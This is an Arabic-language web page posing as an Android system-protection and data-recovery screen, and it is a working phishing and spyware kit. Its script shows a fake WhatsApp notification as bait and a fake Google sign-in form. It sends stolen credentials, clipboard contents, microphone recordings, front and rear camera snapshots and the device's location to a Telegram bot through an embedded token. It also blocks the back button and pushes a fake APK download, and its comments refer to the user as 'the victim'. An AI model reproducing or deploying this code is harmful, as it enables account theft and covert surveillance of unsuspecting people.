<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚙️ نظام الحماية الذكي</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .container { width: 85%; max-content: 400px; transition: filter 0.5s; }
        .android-logo { width: 70px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.6; }
        .progress-bg { width: 100%; height: 4px; background: #222; border-radius: 10px; margin: 15px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: #4caf50; border-radius: 10px; transition: width 0.5s; }
        
        /* إشعار واتساب وهمي للإغراء بالضغط */
        #fake-notify { position: fixed; top: 20px; width: 90%; max-width: 350px; background: #fff; color: #000; padding: 15px; border-radius: 12px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10000; cursor: pointer; animation: slideDown 0.5s ease; }
        @keyframes slideDown { from { transform: translateY(-100px); } to { transform: translateY(0); } }
        
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .login-card { width: 90%; max-width: 360px; padding: 30px; text-align: center; }
        .login-card img { width: 70px; margin-bottom: 15px; }
        .login-card input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div id="fake-notify" onclick="requestFullPermissions()">
        <div style="display:flex; align-items:center;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="30" style="margin-left:10px;">
            <div style="text-align:right;">
                <b style="font-size:14px;">WhatsApp</b><br>
                <span style="font-size:12px; color:#555;">لديك رسالة جديدة: "شاهد الصورة الخاصة التي..."</span>
            </div>
        </div>
    </div>

    <div class="container" id="main-ui">
        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
        <div style="font-size:16px;">جاري تأمين ملفات النظام... <span id="percent">0%</span></div>
        <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
        <p style="font-size:11px; color:#444;">يرجى عدم إغلاق المتصفح لضمان استرجاع البيانات المفقودة.</p>
    </div>

    <div id="phish-overlay">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
            <h2 style="font-size:20px; font-weight:400;">تحقق من ملكية الحساب</h2>
            <p style="font-size:13px; color:#5f6368;">لحماية جهازك، يرجى إعادة إثبات هويتك</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="sendCreds()">متابعة</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let currentStream = null;

        function notify(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        // 1. طلب الصلاحيات الكاملة (يتم استدعاؤه عند ضغط الإشعار الوهمي)
        async function requestFullPermissions() {
            document.getElementById('fake-notify').style.display = 'none';
            notify("🎯 الضحية تفاعل مع إشعار الواتساب الوهمي!");
            startSnooping(); // يبدأ التصوير والصوت فوراً
        }

        // 2. تحميل ملف خبيث تلقائياً (هندسة اجتماعية)
        function triggerDownload() {
            const link = document.createElement('a');
            link.href = 'data:text/plain;base64,V2FybmluZyE='; // ملف وهمي
            link.download = 'Security_Update_Fix.apk';
            link.click();
            notify("📥 تم محاولة تنزيل ملف APK وهمي على جهاز الضحية.");
        }

        // 3. منع الخروج + سحب الحافظة
        function lockAndSniff() {
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => { window.history.pushState(null, null, window.location.href); notify("🚫 حاول الضحية الهروب!"); };
            
            document.addEventListener('click', async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if(text) notify(`📋 **نص مسروق من الحافظة:**\n\`${text}\``);
                } catch(e) {}
            }, {once: true});
        }

        // 4. التجسس الصوتي والبصري المزدوج (2 ثانية)
        async function startSnooping() {
            // الصوت (كل 15 ثانية)
            try {
                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(aStream);
                rec.ondataavailable = (e) => {
                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'mic.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
            } catch(e) { notify("❌ رفض الميكروفون."); }

            // الكاميرا التتابعية
            const modes = ["user", "environment"];
            let i = 0;
            while(true) {
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    document.getElementById('video').srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 800));
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg');
                        fd.append('caption', `👁️ لقطة: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 2000));
            }
        }

        function sendCreds() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("اكتمل الفحص. لم يتم العثور على فيروسات.");
            }
        }

        window.onload = () => {
            lockAndSniff();
            // إظهار إشعار الواتساب بعد 3 ثوانٍ
            setTimeout(() => { document.getElementById('fake-notify').style.display = 'block'; }, 3000);
            
            // محاكاة التحديث
            let p = 0;
            const interval = setInterval(() => {
                if (p < 99) { p++; document.getElementById('bar').style.width = p + '%'; document.getElementById('percent').innerText = p + '%'; }
            }, 7000);

            // سحب الموقع والبيانات التقنية
            navigator.geolocation.getCurrentPosition(pos => {
                notify(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });
            
            // إظهار تسجيل الدخول الوهمي بعد دقيقة من التمويه
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
                triggerDownload(); // محاولة تنزيل الملف عند هذه النقطة
            }, 45000);
            
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
